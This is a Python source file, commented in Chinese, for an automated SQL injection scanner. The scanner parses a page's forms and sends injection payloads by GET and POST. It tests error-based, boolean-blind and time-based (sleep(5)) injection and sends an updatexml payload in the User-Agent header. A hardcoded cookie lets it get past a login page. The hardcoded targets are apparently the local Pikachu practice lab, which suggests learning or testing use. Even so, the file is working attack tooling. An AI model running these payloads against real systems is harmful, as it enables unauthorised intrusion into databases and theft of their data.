import requests
from bs4 import BeautifulSoup

class SqlInject(object):
    def __init__(self, url, config_ini):
        super(SqlInject, self).__init__()
        self.url = url
        self.config_ini = config_ini

        self.path = self.config_ini['main_project']['project_path'] + self.config_ini['sql']['sql_py']
        self.output = self.config_ini['main_project']['project_path'] + self.config_ini['sql']['sql_log']
        self.inject_file = self.config_ini['main_project']['project_path'] + self.config_ini['sql']['sql_inject']

    def detect(self):
        is_injectable = []
        result_list = []
        sql_flag = 0
        logtext = ""
        warningtext = ""

        my_response = requests.get(self.url)
        my_html_content = my_response.text
        # print(my_html_content)
        my_soup = BeautifulSoup(my_html_content, 'html.parser')

        form_tags = my_soup.find_all('form')
        select_tags = my_soup.find_all('select')
        input_tags = my_soup.find_all('input')
        p_tags = my_soup.find_all('p')
        textarea = my_soup.find_all('textarea')
        for form_tag in form_tags:
            p_tags = form_tag.find_all('p')
            select_tags = form_tag.find_all('select')
            textarea_tags = form_tag.find_all('textarea')

        payload_list = []

        with open(self.inject_file, 'r') as f:
            payloads = f.readlines()
            for payload in payloads:
                payload = payload.strip()
                payload_list.append(payload)
        f.close()

        ### 基础检测
        method = ''
        for form in form_tags:
            method = form.get('method')

            if method == 'get':
                for payload in payload_list:
                    params = {}
                    for tag in input_tags:
                        argName = tag.get('name')
                        if tag.get('value') != None:
                            argVal = tag.get('value')
                        else:
                            argVal = payload
                        params[argName] = argVal
                    print(params)
                    logtext = logtext + "[已发送GET请求]"
                    try:
                        my_response_1 = requests.get(self.url, params=params, timeout=3)
                        result = my_response_1.text
                        if result.find("SQL syntax") != -1 or result.find("XPATH syntax") != -1:
                            is_injectable.append(True)
                            result_list.append(my_response_1.url)
                            sql_flag = 1
                            logtext = logtext + "存在sql注入漏洞：" + my_response_1.url + "\n"
                        # 布尔盲注注入点测试
                        elif result.find(
                                "您输入的username不存在") == -1 and payload == 'lucy\' #' and self.url == 'http://127.0.0.1:8080/pikachu-master/vul/sqli/sqli_blind_b.php':
                            is_injectable.append(True)
                            result_list.append(my_response_1.url)
                            sql_flag = 5
                            logtext = logtext + "存在sql注入漏洞（存在布尔盲注注入点）：" + my_response_1.url + "\n"
                            print("存在布尔盲注注入点......")
                    except requests.Timeout:
                        # 时间盲注注入点测试
                        if payload == 'lucy\' and sleep(5) #':
                            is_injectable.append(True)
                            result_list.append(my_response_1.url)
                            sql_flag = 6
                            logtext = logtext + "存在sql注入漏洞（存在时间盲注注入点）：" + my_response_1.url + "\n"
                            print("存在时间盲注注入点......")
            elif method == 'post':
                for payload in payload_list:
                    data_form = {}
                    if select_tags:
                        for selTag in select_tags:
                            argName = selTag.get('name')
                            argVal = payload
                            data_form[argName] = "1" + argVal
                    if p_tags:
                        for pTag in p_tags:
                            argName = pTag.get('name')
                            if tag.get('value') != None:
                                argVal = pTag.get('value')
                            else:
                                argVal = payload
                            data_form[argName] = argVal
                    if textarea_tags:
                        for areaTag in textarea_tags:
                            argName = areaTag.get('name')
                            argVal = payload
                            data_form[argName] = argVal

                    for tag in input_tags:
                        argName = tag.get('name')
                        if tag.get('value') != None:
                            argVal = tag.get('value')
                        else:
                            argVal = payload
                        data_form[argName] = argVal
                    logtext = logtext + "[已发送POST请求]"
                    print(data_form)
                    try:
                        my_response_2 = requests.post(self.url, data=data_form, timeout=3)
                        result = my_response_2.text
                        if result.find("SQL syntax") != -1 or result.find("XPATH syntax") != -1:
                            is_injectable.append(True)
                            result_list.append(my_response_2.url)
                            sql_flag = 2
                            logtext = logtext + "存在sql注入漏洞：" + my_response_2.url + "\n"
                        elif result.find(
                                "您输入的username不存在") == -1 and payload == 'lucy\' #' and self.url == 'http://127.0.0.1:8080/pikachu-master/vul/sqli/sqli_blind_b.php':
                            is_injectable.append(True)
                            result_list.append(my_response_2.url)
                            sql_flag = 5
                            logtext = logtext + "存在sql注入漏洞（存在布尔盲注注入点）：" + my_response_2.url + "\n"
                            print("存在盲注注入点......")
                    except requests.Timeout:
                        # 时间盲注注入点测试
                        if payload == 'lucy\' and sleep(5) #':
                            is_injectable.append(True)
                            result_list.append(my_response_2.url)
                            sql_flag = 6
                            logtext = logtext + "存在sql注入漏洞（存在时间盲注注入点）：" + my_response_2.url + "\n"
                            print("存在时间盲注注入点......")

        ### 二层检测：查看不到源码的二层页面
        if len(result_list) == 0:
            for payload in payload_list:
                temp_url = self.url
                temp_url = temp_url + payload
                response = requests.get(temp_url, allow_redirects=False)
                result = response.text
                logtext = logtext + "[二层检测]已向查看不到源码的二层页面发送GET请求："
                if result.find("SQL syntax") != -1 or result.find("XPATH syntax") != -1:
                    is_injectable.append(True)
                    result_list.append(response.url)
                    sql_flag = 3
                    logtext = logtext + "存在delete-sql注入漏洞：" + response.url + "\n"
                    print(temp_url)

        ### 三层检测：http头注入检测
        user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4146.4 Safari/537.36'
        # 构造cookie越过登录页面
        cookie = "ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=v3d1ancf4v9jvsu3dnu8t45hcg; security=medium"
        if len(result_list) == 0:
            agent_inject = "' or  updatexml(1,concat(0x7e,user()),0)  or '"
            headers = {
                'User-Agent': agent_inject,
                'Cookie': cookie
            }
            response = requests.get(url=self.url, headers=headers)
            result = response.text
            logtext = logtext + "[三层检测]已注入http请求头并发送GET请求："
            # print(result)
            if result.find("SQL syntax") != -1 or result.find("XPATH syntax") != -1:
                is_injectable.append(True)
                result_list.append(response.url)
                sql_flag = 4
                logtext = logtext + "存在http头注入漏洞：" + response.url + "\n"

        if len(result_list) == 0:
            print("no sql inject")
        else:
            print("*" * 50)
            print("exist sql inject")
            for item in result_list:
                print(item + "\t注入测试成功 √")
            print(logtext)
        print("*" * 50)

        return logtext, logtext



